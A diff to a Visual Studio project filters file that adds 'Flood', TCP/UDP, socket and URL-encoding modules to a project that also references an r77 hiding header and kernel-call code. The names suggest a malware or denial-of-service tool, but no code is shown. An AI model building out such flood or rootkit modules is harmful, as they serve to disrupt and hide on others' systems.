@@ -70,6 +70,24 @@
     <Filter Include="源文件\函数模块\查询">
       <UniqueIdentifier>{f1253306-930d-4caf-8ca3-052831216d88}</UniqueIdentifier>
     </Filter>
+    <Filter Include="源文件\函数模块\TCP&amp;UDP">
+      <UniqueIdentifier>{e9710a3b-7787-41d2-9f9e-2c510d66c75b}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="头文件\Flood">
+      <UniqueIdentifier>{69216f80-298f-4892-ad90-2ba22f4b3822}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="头文件\Socket">
+      <UniqueIdentifier>{3d26e786-1fa9-4572-a273-0e10cdfaf944}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="源文件\函数模块\Socket">
+      <UniqueIdentifier>{9f07b0b8-81e2-471b-babb-a97d7ce90aaa}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="源文件\函数模块\加密连接">
+      <UniqueIdentifier>{a7ee2a1f-cf8d-4a3a-a952-52a9219935da}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="头文件\Encoding">
+      <UniqueIdentifier>{72533af7-41d2-4bff-be1f-e77fd253279a}</UniqueIdentifier>
+    </Filter>
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="control.cpp">
@@ -102,9 +120,6 @@
     <ClCompile Include="kernel.cpp">
       <Filter>源文件\函数模块\R3调R0函数</Filter>
     </ClCompile>
-    <ClCompile Include="Process Police.cpp">
-      <Filter>源文件\函数模块\进程狗</Filter>
-    </ClCompile>
     <ClCompile Include="search_regedit_information.cpp">
       <Filter>源文件\函数模块\查询</Filter>
     </ClCompile>
@@ -113,6 +128,15 @@
     </ClCompile>
     <ClCompile Include="Socket_Tcp_Server.cpp">
       <Filter>源文件\函数模块\连接/Socket套接字</Filter>
+    </ClCompile>
+    <ClCompile Include="Flood.cpp">
+      <Filter>源文件\函数模块\TCP&amp;UDP</Filter>
+    </ClCompile>
+    <ClCompile Include="hand file\Socket\Sockets.cpp">
+      <Filter>源文件\函数模块\Socket</Filter>
+    </ClCompile>
+    <ClCompile Include="hand file\Encoding\URLEncoding.cpp">
+      <Filter>源文件\函数模块\加密连接</Filter>
     </ClCompile>
   </ItemGroup>
   <ItemGroup>
@@ -142,6 +166,12 @@
     </ClInclude>
     <ClInclude Include="hand file\r77\r77 hand\r77api.h">
       <Filter>头文件\hide System Project</Filter>
+    </ClInclude>
+    <ClInclude Include="hand file\Socket\Sockets.h">
+      <Filter>头文件\Socket</Filter>
+    </ClInclude>
+    <ClInclude Include="hand file\Encoding\URLEncoding.h">
+      <Filter>头文件\Encoding</Filter>
     </ClInclude>
   </ItemGroup>
   <ItemGroup>
